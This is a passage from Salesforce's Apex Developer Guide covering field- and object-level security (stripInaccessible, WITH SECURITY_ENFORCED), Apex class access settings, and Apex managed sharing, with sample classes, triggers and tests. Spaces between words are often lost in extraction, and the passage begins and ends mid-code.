}
}
215
Working with Data in ApexApex Developer Guide

}
}
Note:  Checkmarx, the AppExchange Security Review source code scanner, hasn’t been updated with this new Apex feature. Until
it’s updated, Checkmarx can generate false positives for field or object level security violations that require exception documentation.
Enforce Security with the stripInaccessible Method
Use the stripInaccessible method to enforce field-level and object-level data protection. This method can be used to strip
the fields and relationship fields from query and subquery results that the user can’t access. The method can also be used to remove
inaccessible sObject fields before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an
untrusted source.
Important:  Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.
The field- and object-level data protection is accessed through the Security and SObjectAccessDecision classes. The access check is
based on the field-level permission of the current user in the context of the specified operation—create, read, update, or upsert. The
Security.stripInaccessible() method checks the source records for fields that don’t meet the field-level security check for the current user.
The method also checks the source records for lookup or master-detail relationship fields to which the current user doesn’t have access.
The method creates a return list of sObjects that is identical to the source records, except that the fields that are inaccessible to the
current user are removed. The sObjects returned by the getRecords method contain records in the same order as the sObjects in
the sourceRecords parameter of the stripInaccessible method.
The Security.stripInaccessible() method takes a permission set ID as a parameter and enforces field-level and object-level
access as per the specified permission set, in addition to the running user’s permissions.
Note:  The ID field is never stripped by the stripInaccessible method to avoid issues when performing DML on the
result.
To identify inaccessible fields that were removed, you can use the SObject.isSet() method. For example, the return list contains the
Contact object and the custom field social_security_number__c is inaccessible to the user. Because this custom field fails the field-level
access check, the field isn’t set and isSet returns false.
SObjectAccessDecisionsecurityDecision= Security.stripInaccessible(AccessType.READABLE,
sourceRecords);
Contactc = securityDecision.getRecords()[0];
System.debug(c.isSet('social_security_number__c')); // prints"false"
Note:  The stripInaccessible method doesn’t support AggregateResult SObject. If the source records are of AggregateResult
SObject type, an exception is thrown.
To enforce object and field permissions on the User object and hide a user’s personal information from other users in orgs with Experience
Cloud sites, see Enforcing Object and Field Permissions.
The following are some examples where the stripInaccessible method can be used.
Example:  This example code removes inaccessible fields from the query result. A display table for campaign data must always
show the BudgetedCost. The ActualCost must be shown only to users who have permission to read that field.
SObjectAccessDecisionsecurityDecision=
Security.stripInaccessible(AccessType.READABLE,
[SELECTName,BudgetedCost,ActualCostFROMCampaign]
);
// Constructthe outputtable
216
Working with Data in ApexApex Developer Guide

if (securityDecision.getRemovedFields().get('Campaign').contains('ActualCost')) {
for (Campaignc : securityDecision.getRecords()){
//System.debugOutput:Name,BudgetedCost
}
} else{
for (Campaignc : securityDecision.getRecords()){
//System.debugOutput:Name,BudgetedCost,ActualCost
}
}
Example:  This example code removes inaccessible fields from the subquery result. The user doesn’t have permission to read the
Phone field of a Contacts object.
List<Account>accountsWithContacts=
[SELECTId, Name,Phone,
(SELECTId, LastName,PhoneFROMAccount.Contacts)
FROMAccount];
// Stripfieldsthatare not readable
SObjectAccessDecisiondecision= Security.stripInaccessible(
AccessType.READABLE,
accountsWithContacts);
// Printstrippedrecords
for (Integeri = 0; i < accountsWithContacts.size();i++)
{
System.debug('Insecurerecordaccess:'+accountsWithContacts[i]);
System.debug('Securerecordaccess:'+decision.getRecords()[i]);
}
// Printmodifiedindexes
System.debug('Recordsmodifiedby stripInaccessible:'+decision.getModifiedIndexes());
// Printremovedfields
System.debug('Fieldsremovedby stripInaccessible:'+decision.getRemovedFields());
Example:  This example code removes inaccessible fields from sObjects before DML operations. The user who doesn’t have
permission to create Rating for an Account can still create an Account. The method ensures that no Rating is set and doesn’t throw
an exception.
List<Account>newAccounts= new List<Account>();
Accounta = new Account(Name='AcmeCorporation');
Accountb = new Account(Name='BlazeComics', Rating=’Warm’);
newAccounts.add(a);
newAccounts.add(b);
SObjectAccessDecisionsecurityDecision= Security.stripInaccessible(
AccessType.CREATABLE,newAccounts);
// No exceptionsare thrownand no ratingis set
217
Working with Data in ApexApex Developer Guide

insertsecurityDecision.getRecords();
System.debug(securityDecision.getRemovedFields().get('Account')); // Prints"Rating"
System.debug(securityDecision.getModifiedIndexes());// Prints"1"
Example:  This example code sanitizes sObjects that have been deserialized from an untrusted source. The user doesn’t have
permission to update the AnnualRevenue of an Account.
StringjsonInput=
'[' +
'{' +
'"Name":"InGen",'+
'"AnnualRevenue":"100"'+
'},'+
'{' +
'"Name":"Octan"'+
'}' +
']';
List<Account>accounts= (List<Account>)JSON.deserializeStrict(jsonInput,
List<Account>.class);
SObjectAccessDecisionsecurityDecision= Security.stripInaccessible(
AccessType.UPDATABLE,accounts);
// Secureupdate
updatesecurityDecision.getRecords();// Doesn’tupdateAnnualRevenuefield
System.debug(String.join(securityDecision.getRemovedFields().get('Account'), ', '));
// Prints"AnnualRevenue"
System.debug(String.join(securityDecision.getModifiedIndexes(),', ')); // Prints"0”
Example:  This example code removes inaccessible relationship fields from the query result. The user doesn’t have permission to
insert the Account__c field, which is a lookup from MyCustomObject__c to Account.
// Account__cis a lookupfromMyCustomObject__cto Account
@IsTest
publicclassTestCustomObjectLookupStripped{
@IsTeststaticvoidcaseCustomObjectStripped(){
Accounta = new Account(Name='foo');
inserta;
List<MyCustomObject__c>records= new List<MyCustomObject__c>{
new MyCustomObject__c(Name='Custom0', Account__c=a.id)
};
insertrecords;
records= [SELECTId, Account__cFROMMyCustomObject__c];
SObjectAccessDecisionsecurityDecision= Security.stripInaccessible
(AccessType.READABLE,records);
// Verifystrippedrecords
System.assertEquals(1,securityDecision.getRecords().size());
for (SObjectstrippedRecord: securityDecision.getRecords()){
System.debug('Id shouldbe set as Id fieldsare ignored:' +
strippedRecord.isSet('Id')); // printstrue
System.debug('LookupfieldFLS is not READABLEto runninguser,
218
Working with Data in ApexApex Developer Guide

shouldnot be set:' +
strippedRecord.isSet('Account__c')); // printsfalse
}
}
}
SEE ALSO:
Apex Reference Guide: AccessType Enum
Apex Reference Guide: Security Class
Apex Reference Guide: SObjectAccessDecision Class
Filter SOQL Queries Using WITH SECURITY_ENFORCED
Use the WITHSECURITY_ENFORCED clause to enable field- and object-level security permissions checking for SOQLSELECT
queries in Apex code, including subqueries and cross-object relationships.
Important: Salesforce recommends that you enforce Field Level Security (FLS) by using WITHUSER_MODE instead of WITH
SECURITY_ENFORCED because it has fewer limitations.
If you enforce user mode, remove any redundant WITHSECURITY_ENFORCED clauses. You can’t combine both forms of
access checks in the same query.
See Enforce User Mode for Database Operations on page 213.
Apex generally runs in system context; that is, the current user's permissions and field-level security aren’t taken into account during
code execution. Sharing rules, however, are not always bypassed: the class must be declared with the withoutsharing keyword
in order to ensure that sharing rules are not enforced. Although performing field- and object-level security checks was possible in earlier
releases, this clause substantially reduces the verbosity and technical complexity in query operations. This feature is tailored to Apex
developers who have minimal development experience with security and to applications where graceful degradation on permissions
errors isn’t required.
Note:  The WITHSECURITY_ENFORCED clause is only available in Apex. We don’t recommend using WITH
SECURITY_ENFORCED in Apex classes or triggers with an API version earlier than 45.0.
WITHSECURITY_ENFORCED applies field- and object-level security checks only to fields and objects referenced in SELECT or
FROM SOQL clauses and not clauses like WHERE or ORDERBY. In other words, security is enforced on what the SOQLSELECT
query returns, not on all the elements that go into running the query.
Insert the WITHSECURITY_ENFORCED clause:
•
After the WHERE clause if one exists, else after the FROM clause.
•
Before any ORDERBY, LIMIT, OFFSET, or aggregate function clauses.
For more information on SOQLSELECT queries, see SOQL SELECT Syntax in the SOQL and SOSL Reference.
For example, if the user has field access for LastName, this query returns Id and LastName for the Acme account entry.
List<Account>act1= [SELECTId, (SELECTLastNameFROMContacts)
FROMAccountWHERENamelike'Acme'WITHSECURITY_ENFORCED]
There are some restrictions while querying polymorphic lookup fields using WITHSECURITY_ENFORCED. Polymorphic fields are
relationship fields that can point to more than one entity.
219
Working with Data in ApexApex Developer Guide

•
Traversing a polymorphic field’s relationship is not supported in queries using WITHSECURITY_ENFORCED. For example, you
cannot use WITHSECURITY_ENFORCED in this query, which returns the Id and Owner names for User and Calendar entities:
SELECTId, What.NameFROMEventWHEREWhat.TypeIN (’User’,’Calendar’).
•
Using TYPEOF expressions with an ELSE clause is not supported in queries using WITHSECURITY_ENFORCED. TYPEOF
is used in a SELECT query to specify the fields to be returned for a given type of a polymorphic relationship. For example, you cannot
use WITHSECURITY_ENFORCED in this query. The query specifies certain fields to be returned for Account and Opportunity
objects, and Name and Email fields to be returned for all other objects.
SELECT
TYPEOF What
WHENAccountTHENPhone
WHENOpportunityTHENAmount
ELSEName,Email
END
FROMEvent
•
The Owner, CreatedBy, and LastModifiedBy polymorphic lookup fields are exempt from this restriction, and do allow
polymorphic relationship traversal.
•
For AppExchange Security Review, you must use API version 48.0 or later when using WITHSECURITY_ENFORCED. You cannot
use API versions where the feature was in beta or pilot.
If any fields or objects referenced in the SOQLSELECT query using WITHSECURITY_ENFORCED are inaccessible to the user,
a System.QueryException is thrown, and no data is returned.
To enforce object and field permissions on the User object and hide a user’s personal information from other users in orgs with Experience
Cloud sites, see Enforcing Object and Field Permissions.
Example:  If field access for either LastName or Description is hidden, this query throws an exception indicating insufficient
permissions.
List<Account>act1= [SELECTId, (SELECTLastNameFROMContacts),
(SELECTDescriptionFROMOpportunities)
FROMAccountWITHSECURITY_ENFORCED]
Example:  If field access for Website is hidden, this query throws an exception indicating insufficient permissions.
List<Account>act2= [SELECTId, parent.Name,parent.Website
FROMAccountWITHSECURITY_ENFORCED]
Example: If field access for Type is hidden, this aggregate function query throws an exception indicating insufficient permissions.
List<AggregateResult>agr1= [SELECTGROUPING(Type)
FROMOpportunityWITHSECURITY_ENFORCED
GROUPBY Type]
Class Security
You can specify which users can execute methods in a particular top-level class based on their user profile or permission sets. You can
only set security on Apex classes, not on triggers.
To set Apex class security from the class list page, seeSet Apex Class Access from the Class List Page
To set Apex class security from the class detail page, see Set Apex Class Access from the Class List Page
To set Apex class security from a permission set:
220
Working with Data in ApexApex Developer Guide

1.From Setup, enter PermissionSets in the QuickFind box, then select Permission Sets.
2.Select a permission set.
3.Click Apex Class Access.
4.Click Edit.
5.Select the Apex classes that you want to enable from the Available Apex Classes list and click Add, or select the Apex classes that
you want to disable from the Enabled Apex Classes list and click Remove.
6.Click Save.
To set Apex class security from a profile:
1.From Setup, enter Profiles in the QuickFind box, then select Profiles.
2.Select a profile.
3.In the Apex Class Access page or related list, click Edit.
4.Select the Apex classes that you want to enable from the Available Apex Classes list and click Add, or select the Apex classes that
you want to disable from the Enabled Apex Classes list and click Remove.
5.Click Save.
Understanding Apex Managed Sharing
Sharing is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing access
can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.
For more information on sharing, see Set Your Internal Organization-Wide Sharing Defaults in the Salesforce online help.
Understanding Sharing
Sharing enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact,
Opportunity and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional
access based on record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed
sharing to grant additional access programmatically with Apex.
Sharing a Record Using Apex
Recalculating Apex Managed Sharing
Understanding Sharing
Sharing enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact, Opportunity
and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional access based on
record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed sharing to grant
additional access programmatically with Apex.
Most sharing for a record is maintained in a related sharing object, similar to an access control list (ACL) found in other platforms.
Types of Sharing
Salesforce has the following types of sharing:
Managed Sharing
Managed sharing involves sharing access granted by Lightning Platform based on record ownership, the role hierarchy, and sharing
rules:
221
Working with Data in ApexApex Developer Guide

Record Ownership
Each record is owned by a user or optionally a queue for custom objects, cases and leads. The record owner is automatically
granted Full Access, allowing them to view, edit, transfer, share, and delete the record.
Role Hierarchy
The role hierarchy enables users above another user in the hierarchy to have the same level of access to records owned by or
shared with users below. Consequently, users above a record owner in the role hierarchy are also implicitly granted Full Access
to the record, though this behavior can be disabled for specific custom objects. The role hierarchy is not maintained with sharing
records. Instead, role hierarchy access is derived at runtime. For more information, see “Controlling Access Using Hierarchies” in
the Salesforce online help.
Sharing Rules
Sharing rules are used by administrators to automatically grant users within a given group or role access to records owned by a
specific group of users. Sharing rules cannot be added to a package and cannot be used to support sharing logic for apps installed
from AppExchange.
Sharing rules can be based on record ownership or other criteria. You can’t use Apex to create criteria-based sharing rules. Also,
criteria-based sharing cannot be tested using Apex.
All implicit sharing added by Force.com managed sharing cannot be altered directly using the Salesforce user interface, SOAP API,
or Apex.
User Managed Sharing, also known as Manual Sharing
User managed sharing allows the record owner or any user with Full Access to a record to share the record with a user or group of
users. This is generally done by an end user, for a single record. Only the record owner and users above the owner in the role hierarchy
are granted Full Access to the record. It is not possible to grant other users Full Access. Users with the “Modify All Records” object-level
permission for the given object or the “Modify All Data” permission can also manually share a record. User managed sharing is
removed when the record owner changes or when the access granted in the sharing does not grant additional access beyond the
object's organization-wide sharing default access level.
Apex Managed Sharing
Apex managed sharing provides developers with the ability to support an application’s particular sharing requirements
programmatically through Apex or the SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All
Data” permission can add or change Apex managed sharing on a record. Apex managed sharing is maintained across record owner
changes.
Note:  Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.
The Sharing Reason Field
In the Salesforce user interface, the Reason field on a custom object specifies the type of sharing used for a record. This field is called
rowCause in Apex or the API.
Each of the following list items is a type of sharing used for records. The tables show Reason field value, and the related rowCause
value.
•
Managed Sharing
rowCause Value (Used in Apex or the API)ReasonField Value
ImplicitChildAccount Sharing
ImplicitParentAssociated record owner or sharing
OwnerOwner
222
Working with Data in ApexApex Developer Guide

rowCause Value (Used in Apex or the API)ReasonField Value
TeamOpportunity Team
RuleSharing Rule
TerritoryRuleTerritory Assignment Rule
•
User Managed Sharing
rowCause Value (Used in Apex or the API)ReasonField Value
ManualManual Sharing
TerritoryManualTerritory Manual
Note:  With Enterprise Territory Management in API
version 45.0 and later,
Territory2AssociationManual replaces
TerritoryManual.
•
Apex Managed Sharing
rowCause Value (Used in Apex or the API)ReasonField Value
Defined by developerDefined by developer
The displayed reason for Apex managed sharing is defined by the developer.
Access Levels
When determining a user’s access to a record, the most permissive level of access is used. Most share objects support the following
access levels:
DescriptionAPI NameAccess Level
Only the record owner and users above the record owner in the role hierarchy
can view and edit the record. This access level only applies to the AccountShare
object.
NonePrivate
The specified user or group can view the record only.ReadRead Only
The specified user or group can view and edit the record.EditRead/Write
The specified user or group can view, edit, transfer, share, and delete the record.AllFull Access
Note:  This access level can only be granted with managed sharing.
223
Working with Data in ApexApex Developer Guide

Sharing Considerations
Apex Triggers and User Record Sharing
If a trigger changes the owner of a record, the running user must have read access to the new owner’s user record if the trigger is
started through the following:
•
API
•
Standard user interface
•
Standard Visualforce controller
•
Class defined with the withsharing keyword
If a trigger is started through a class that’s not defined with the withsharing keyword, the trigger runs in system mode. In
this case, the trigger doesn’t require the running user to have specific access.
Sharing a Record Using Apex
Important:  Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.
To access sharing programmatically, you must use the share object associated with the standard or custom object for which you want
to share. For example, AccountShare is the sharing object for the Account object, ContactShare is the sharing object for the Contact
object. In addition, all custom object sharing objects are named as follows, where MyCustomObject is the name of the custom
object:
MyCustomObject__Share
Objects on the detail side of a master-detail relationship don’t have an associated sharing object. The detail record’s access is determined
by the master’s sharing object and the relationship’s sharing setting. For more information, see “Custom Object Security” in the Salesforce
Help.
A share object includes records supporting all three types of sharing: managed sharing, user managed sharing, and Apex managed
sharing. Sharing that is granted to users implicitly through organization-wide defaults, the role hierarchy, and permissions such as the
“View All Records” and “Modify All Records” permissions for the given object, “View All Data,” and “Modify All Data” aren’t tracked with
this object.
Every share object has the following properties:
DescriptionProperty Name
The level of access that the specified user or group has been granted for a share sObject. The name
of the property is AccessLevel appended to the object name. For example, the property name
for LeadShare object is LeadAccessLevel. Valid values are:
objectNameAccessLevel
•
Edit
•
Read
•
All
Note:  The All access level is an internal value and can’t be granted.
This field must be set to an access level that’s higher than the organization’s default access level for
the parent object. For more information, see Understanding Sharing on page 221.
The ID of the custom object. This field can’t be updated.ParentID
The reason why the user or group is being granted access. The reason determines the type of sharing,
which controls who can alter the sharing record. This field can’t be updated.
RowCause
224
Working with Data in ApexApex Developer Guide

DescriptionProperty Name
The user or group IDs to which you’re granting access. A group can be:UserOrGroupId
•
A public group or a sharing group associated with a role.
•
A territory group.
This field can’t be updated.
Note:  You can't grant access to unauthenticated guest users using Apex.
You can share a standard or custom object with users or groups. For more information about the types of users and groups you can
share an object with, see User and Group in the Object Reference for Salesforce.
Creating User Managed Sharing Using Apex
It’s possible to manually share a record to a user or a group using Apex or SOAP API. If the owner of the record changes, the sharing is
automatically deleted. The following example class contains a method that shares the job specified by the job ID with the specified user
or group ID with read access. It also includes a test method that validates this method. Before you save this example class, create a
custom object called Job.
Note:  Manual shares written using Apex contains RowCause="Manual" by default. Only shares with this condition are
removed when ownership changes.
publicclassJobSharing{
publicstaticbooleanmanualShareRead(IdrecordId,Id userOrGroupId){
// Createnew sharingobjectfor the customobjectJob.
Job__SharejobShr= new Job__Share();
// Set the ID of recordbeingshared.
jobShr.ParentId= recordId;
// Set the ID of useror groupbeinggrantedaccess.
jobShr.UserOrGroupId= userOrGroupId;
// Set the accesslevel.
jobShr.AccessLevel= 'Read';
// Set rowCauseto 'manual'for manualsharing.
// Thislinecan be omittedas 'manual'is the defaultvaluefor sharingobjects.
jobShr.RowCause= Schema.Job__Share.RowCause.Manual;
// Insertthe sharingrecordand capturethe saveresult.
// The falseparameterallowsfor partialprocessingif multiplerecordspassed
// intothe operation.
Database.SaveResultsr = Database.insert(jobShr,false);
// Processthe saveresults.
if(sr.isSuccess()){
// Indicatessuccess
returntrue;
}
225
Working with Data in ApexApex Developer Guide

else{
// Get firstsaveresulterror.
Database.Errorerr = sr.getErrors()[0];
// Checkif the erroris relatedto trivalaccesslevel.
// Accesslevelmustbe morepermissivethanthe object'sdefault.
// Thesesharingrecordsare not requiredand thusan insertexceptionis
acceptable.
if(err.getStatusCode()== StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION&&
err.getMessage().contains('AccessLevel')){
// Indicatessuccess.
returntrue;
}
else{
// Indicatesfailure.
returnfalse;
}
}
}
}
@isTest
privateclassJobSharingTest{
// Testfor the manualShareReadmethod
statictestMethodvoidtestManualShareRead(){
// Selectusersfor the test.
List<User>users= [SELECTId FROMUserWHEREIsActive= trueLIMIT2];
Id User1Id= users[0].Id;
Id User2Id= users[1].Id;
// Createnew job.
Job__cj = new Job__c();
j.Name= 'TestJob';
j.OwnerId= user1Id;
insertj;
// Insertmanualsharefor userwho is not recordowner.
System.assertEquals(JobSharing.manualShareRead(j.Id,user2Id),true);
// Queryjob sharingrecords.
List<Job__Share>jShrs= [SELECTId, UserOrGroupId,AccessLevel,
RowCauseFROMjob__shareWHEREParentId= :j.IdAND UserOrGroupId=:user2Id];
// Testfor onlyone manualshareon job.
System.assertEquals(jShrs.size(),1, 'Setthe object\'ssharingmodelto Private.');
// Testattributesof manualshare.
System.assertEquals(jShrs[0].AccessLevel,'Read');
System.assertEquals(jShrs[0].RowCause,'Manual');
System.assertEquals(jShrs[0].UserOrGroupId,user2Id);
// Testinvalidjob Id.
226
Working with Data in ApexApex Developer Guide

deletej;
// Insertmanualsharefor deletedjob id.
System.assertEquals(JobSharing.manualShareRead(j.Id,user2Id),false);
}
}
Important:  The object’s organization-wide default access level must not be set to the most permissive access level. For custom
objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 221.
Creating Apex Managed Sharing
Apex managed sharing enables developers to programmatically manipulate sharing to support their application’s behavior through
either Apex or SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All Data” permission can add or
change Apex managed sharing on a record. Apex managed sharing is maintained across record owner changes.
Apex managed sharing must use an Apex sharing reason. Apex sharing reasons are a way for developers to track why they shared a record
with a user or group of users. Using multiple Apex sharing reasons simplifies the coding required to make updates and deletions of
sharing records. They also enable developers to share with the same user or group multiple times using different reasons.
Note:  Apex sharing reasons aren’t available in Lightning Experience. Use Salesforce Classic to create sharing reasons within the
UI. See Point and Click Customization for the complete list of differences in features and settings between Salesforce Classic and
Lightning Experience.
Apex sharing reasons are defined on an object's detail page. Each Apex sharing reason has a label and a name:
•
The label displays in the Reason column when viewing the sharing for a record in the user interface. This label allows users and
administrators to understand the source of the sharing. The label is also enabled for translation through the Translation Workbench.
•
The name is used when referencing the reason in the API and Apex.
All Apex sharing reason names have the following format:
MyReasonName__c
Apex sharing reasons can be referenced programmatically as follows:
Schema.CustomObject__Share.rowCause.SharingReason__c
For example, an Apex sharing reason called Recruiter for an object called Job can be referenced as follows:
Schema.Job__Share.rowCause.Recruiter__c
For more information, see System.Schema Class.
To create an Apex sharing reason:
1.From the management settings for the custom object, click New in the Apex Sharing Reasons related list.
2.Enter a label for the Apex sharing reason. The label displays in the Reason column when viewing the sharing for a record in the
user interface. The label is also enabled for translation through the Translation Workbench.
3.Enter a name for the Apex sharing reason. The name is used when referencing the reason in the API and Apex. This name can contain
only underscores and alphanumeric characters, and must be unique in your org. It must begin with a letter, not include spaces, not
end with an underscore, and not contain two consecutive underscores.
4.Click Save.
Note:  Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.
227
Working with Data in ApexApex Developer Guide

Apex Managed Sharing Example
For this example, suppose that you’re building a recruiting application and have an object called Job. You want to validate that the
recruiter and hiring manager listed on the job have access to the record. The following trigger grants the recruiter and hiring manager
access when the job record is created. This example requires a custom object called Job, with two lookup fields associated with User
records called Hiring_Manager and Recruiter. Also, the Job custom object must have two sharing reasons added called Hiring_Manager
and Recruiter.
triggerJobApexSharingon Job__c(afterinsert) {
if(trigger.isInsert){
// Createa new listof sharingobjectsfor Job
List<Job__Share>jobShrs= new List<Job__Share>();
// Declarevariablesfor recruitingand hiringmanagersharing
Job__SharerecruiterShr;
Job__SharehmShr;
for(Job__cjob : trigger.new){
// Instantiatethe sharingobjects
recruiterShr= new Job__Share();
hmShr= new Job__Share();
// Set the ID of recordbeingshared
recruiterShr.ParentId= job.Id;
hmShr.ParentId= job.Id;
// Set the ID of useror groupbeinggrantedaccess
recruiterShr.UserOrGroupId= job.Recruiter__c;
hmShr.UserOrGroupId= job.Hiring_Manager__c;
// Set the accesslevel
recruiterShr.AccessLevel= 'edit';
hmShr.AccessLevel= 'read';
// Set the Apexsharingreasonfor hiringmanagerand recruiter
recruiterShr.RowCause= Schema.Job__Share.RowCause.Recruiter__c;
hmShr.RowCause= Schema.Job__Share.RowCause.Hiring_Manager__c;
// Add objectsto listfor insert
jobShrs.add(recruiterShr);
jobShrs.add(hmShr);
}
// Insertsharingrecordsand capturesaveresult
// The falseparameterallowsfor partialprocessingif multiplerecordsare passed
// intothe operation
Database.SaveResult[]lsr = Database.insert(jobShrs,false);
// Createcounter
Integeri=0;
// Processthe saveresults
for(Database.SaveResultsr : lsr){
228
Working with Data in ApexApex Developer Guide

if(!sr.isSuccess()){
// Get the firstsaveresulterror
Database.Errorerr = sr.getErrors()[0];
// Checkif the erroris relatedto a trivialaccesslevel
// Accesslevelsequalor morepermissivethanthe object'sdefault
// accesslevelare not allowed.
// Thesesharingrecordsare not requiredand thusan insertexceptionis
// acceptable.
if(!(err.getStatusCode()== StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
&&
err.getMessage().contains('AccessLevel'))){
// Throwan errorwhenthe erroris not relatedto trivialaccess
level.
trigger.newMap.get(jobShrs[i].ParentId).
addError(
'Unableto grantsharingaccessdue to followingexception:'
+ err.getMessage());
}
}
i++;
}
}
}
Under certain circumstances, inserting a share row results in an update of an existing share row. Consider these examples:
•
A manual share access level is set to Read and you insert a new one set to Write. The original share rows are updated to Write,
indicating the higher level of access.
•
Users can access an account because they can access its child records (contact, case, opportunity, and so on). If an account sharing
rule is created, the sharing rule row cause (which is a higher access level) replaces the parent implicit share row cause, indicating
the higher level of access.
Important:  The object’s organization-wide default access level must not be set to the most permissive access level. For custom
objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 221.
Creating Apex Managed Sharing for Customer Community Plus users
Customer Community Plus users are previously known as Customer Portal users. Share objects, such as AccountShare and
ContactShare, aren’t available to these users. If you must use share objects as a Customer Community Plus user, consider using a
trigger, which operates with the withoutsharing keyword by default. Otherwise, use an inner class with the same keyword to
enable the DML operation to run successfully. A separate utility class can also be used to enable this access.
Granting visibility via manual or apex shares written to the share objects is supported but the objects themselves aren't available to
Customer Community Plus users. However, other users can add shares that grant access to Customer Community Plus users.
Warning:  After enabling digital experiences, records accessible to Roles and Subordinates via Apex managed sharing are
automatically made accessible to Roles, Internal, and Portal Subordinates. To secure external users’ access, update your Apex code
so that it creates shares to the Role and Internal Subordinates group. Because this conversion is a large-scale operation, consider
using batch Apex.
229
Working with Data in ApexApex Developer Guide

Recalculating Apex Managed Sharing
Salesforce automatically recalculates sharing for all records on an object when its organization-wide sharing default access level changes.
The recalculation adds managed sharing when appropriate. In addition, all types of sharing are removed if the access they grant is
considered redundant. For example, manual sharing, which grants Read Only access to a user, is deleted when the object’s sharing
model changes from Private to Public Read Only.
To recalculate Apex managed sharing, you must write an Apex class that implements a Salesforce-provided interface to do the recalculation.
You must then associate the class with the custom object, on the custom object's detail page, in the Apex Sharing Recalculation related
list.
Note:  Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.
You can execute this class from the custom object detail page where the Apex sharing reason is specified. An administrator might need
to recalculate the Apex managed sharing for an object if a locking issue prevented Apex code from granting access to a user as defined
by the application’s logic. You can also use the Database.executeBatch method  to programmatically invoke an Apex managed sharing
recalculation.
Note:  Every time a custom object's organization-wide sharing default access level is updated, any Apex recalculation classes
defined for associated custom object are also executed.
To monitor or stop the execution of the Apex recalculation, from Setup, enter ApexJobs in the QuickFind box, then select
Apex Jobs.
Creating an Apex Class for Recalculating Sharing
To recalculate Apex managed sharing, you must write an Apex class to do the recalculation. This class must implement the
Salesforce-provided interface Database.Batchable.
The Database.Batchable interface is used for all batch Apex processes, including recalculating Apex managed sharing. You can
implement this interface more than once in your organization. For more information on the methods that must be implemented, see
Use Batch Apex on page 303.
Before creating an Apex managed sharing recalculation class, also consider the best practices.
Important:  The object’s organization-wide default access level must not be set to the most permissive access level. For custom
objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 221.
Apex Managed Sharing Recalculation Example
For this example, suppose that you are building a recruiting application and have an object called Job. You want to validate that the
recruiter and hiring manager listed on the job have access to the record. The following Apex class performs this validation. This example
requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter. Also, the
Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this sample, replace
the email address with a valid email address to which you want to send error notifications and job completion notifications.
globalclassJobSharingRecalcimplementsDatabase.Batchable<sObject>{
// Stringto holdemailaddressthatemailswillbe sentto.
// Replaceits valuewitha validemailaddress.
staticStringemailAddress= 'admin@yourcompany.com';
// The startmethodis calledat the beginningof a sharingrecalculation.
// Thismethodreturnsa SOQLquerylocatorcontainingthe records
// to be recalculated.
230
Working with Data in ApexApex Developer Guide

globalDatabase.QueryLocatorstart(Database.BatchableContextBC){
returnDatabase.getQueryLocator([SELECTId, Hiring_Manager__c,Recruiter__c
FROMJob__c]);
}
// The executeBatchmethodis calledfor eachchunkof recordsreturnedfromstart.
globalvoidexecute(Database.BatchableContextBC, List<sObject>scope){
// Createa map for the chunkof recordspassedintomethod.
Map<ID, Job__c>jobMap= new Map<ID, Job__c>((List<Job__c>)scope);
// Createa listof Job__Shareobjectsto be inserted.
List<Job__Share>newJobShrs= new List<Job__Share>();
// Locateall existingsharingrecordsfor the Job recordsin the batch.
// Onlyrecordsusingan Apexsharingreasonfor thisapp shouldbe returned.
List<Job__Share>oldJobShrs= [SELECTId FROMJob__ShareWHEREParentIdIN
:jobMap.keySet()AND
(RowCause= :Schema.Job__Share.rowCause.Recruiter__cOR
RowCause= :Schema.Job__Share.rowCause.Hiring_Manager__c)];
// Constructnew sharingrecordsfor the hiringmanagerand recruiter
// on eachJob record.
for(Job__cjob : jobMap.values()){
Job__SharejobHMShr= new Job__Share();
Job__SharejobRecShr= new Job__Share();
// Set the ID of user(hiringmanager)on the Job recordbeinggrantedaccess.
jobHMShr.UserOrGroupId= job.Hiring_Manager__c;
// The hiringmanageron the job shouldalwayshave'ReadOnly'access.
jobHMShr.AccessLevel= 'Read';
// The ID of the recordbeingshared
jobHMShr.ParentId= job.Id;
// Set the rowCauseto the Apexsharingreasonfor hiringmanager.
// Thisestablishesthe sharingrecordas Apexmanagedsharing.
jobHMShr.RowCause= Schema.Job__Share.RowCause.Hiring_Manager__c;
// Add sharingrecordto listfor insertion.
newJobShrs.add(jobHMShr);
// Set the ID of user(recruiter)on the Job recordbeinggrantedaccess.
jobRecShr.UserOrGroupId= job.Recruiter__c;
// The recruiteron the job shouldalwayshave'Read/Write'access.
jobRecShr.AccessLevel= 'Edit';
// The ID of the recordbeingshared
jobRecShr.ParentId= job.Id;
// Set the rowCauseto the Apexsharingreasonfor recruiter.
231
Working with Data in ApexApex Developer Guide

// Thisestablishesthe sharingrecordas Apexmanagedsharing.
jobRecShr.RowCause= Schema.Job__Share.RowCause.Recruiter__c;
// Add the sharingrecordto the listfor insertion.
newJobShrs.add(jobRecShr);
}
try {
// Deletethe existingsharingrecords.
// Thisallowsnew sharingrecordsto be writtenfromscratch.
DeleteoldJobShrs;
// Insertthe new sharingrecordsand capturethe saveresult.
// The falseparameterallowsfor partialprocessingif multiplerecordsare
// passedintooperation.
Database.SaveResult[]lsr = Database.insert(newJobShrs,false);
// Processthe saveresultsfor insert.
for(Database.SaveResultsr : lsr){
if(!sr.isSuccess()){
// Get the firstsaveresulterror.
Database.Errorerr = sr.getErrors()[0];
// Checkif the erroris relatedto trivialaccesslevel.
